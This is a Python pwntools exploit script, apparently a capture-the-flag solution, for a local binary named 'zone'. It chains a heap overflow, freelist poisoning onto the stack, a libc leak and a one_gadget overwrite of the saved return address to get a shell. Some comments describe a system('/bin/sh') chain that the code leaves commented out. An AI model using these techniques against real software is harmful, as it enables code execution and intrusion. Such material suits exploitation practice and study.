from pwn import *
import sys
 

r=process('./zone')

context.log_level = 'debug'

if "gdb" in sys.argv:
    gdb.attach(r, '''
    set disassembly-flavor intel
    set height 0
    b *0x40104f
    c
    ''')
 
pop_rdi=0x0000000000404653 # pop rdi ; ret
pop_rsi=0x00000000004051f8 # pop rsi ; ret
 
def get_stack_addr():
    r.recvuntil(':')
    leak=r.recvuntil('\n').strip()
    leak=int(leak,16)
    return leak
 
def allocate(size):
    r.recvuntil('Exit')
    r.sendline('1')
    r.sendline(str(size))
 
def delete():
    r.recvuntil('Exit')
    r.sendline('2')
 
def write(data,s=False):
    r.recvuntil('Exit')
    r.sendline('3')
    sleep(0.1)
    if s:
        r.sendline(data)
    else:
        r.send(data)
 
def puts():
    r.recvuntil('Exit')
    r.sendline('4')
 
if __name__=='__main__':
 
    stack = get_stack_addr()    #recieve the stack leak
    print "stack addr", hex(stack)
 
    allocate(0x40)
    payload="A"*0x40+chr(0x80)  
    r.clean()
    write(payload)              #overwrite the size of the next chunk
    allocate(0x40)              #the value in this chunks   size field has been overwritten to 0x80
    delete()                    #putting chunk in head of freelist of 0x80 arena

    allocate(0x80) # this will cause the 0x80 block to be put in the 0x40 arena, by some magic 
    # then, fill one 0x40 chunk and overflow the second 0x40 chunk

    # write the correct size, then location on stack
    overflow_chunk = 'B'*0x40 + p64(0x40) + p64(stack+0x80-8)
    write(overflow_chunk,True)         #overwrite next ptr of the next chunk
    allocate(0x40)
    allocate(0x40)
    puts()                      #print value at saved eip i.e libc leak

    leak = r.recvuntil('1)')
    print "leak", repr(leak)
    leak=leak.replace('\n','').replace(' ','').replace('1)','').ljust(8,"\x00")
    leak=u64(leak)
    print "----------------"
    print "libc leak = "+hex(leak)
    print "----------------"
    
    libc_base = leak - 131809
    print "----------------"
    print "libc base = "+hex(libc_base)
    print "----------------"


    # HOw did I find these offsets? Using pwntools!
    #  hex(next(l.search("/bin/sh")))
    # hex(l.symbols['puts'])


    system = libc_base+0x3f480
    binsh = libc_base+0x1619b9

    # tHIS OFFSET WAs found using one_gadget ruby gem 
    one_gadget = libc_base + 0xd694f
 
    payload=p64(one_gadget)
    # payload+=p64(binsh)
    # payload+=p64(system)
 
    write(payload,True)        #overwrite saved eip with payload
    r.sendline('5')            #after main returns, pop rdi pops ptr to /bin/sh in rdi and
                               #then control goes to system with arguement as ptr to /bin/sh (rdi)
    r.recvuntil('Exit')
    r.interactive()            #get the shell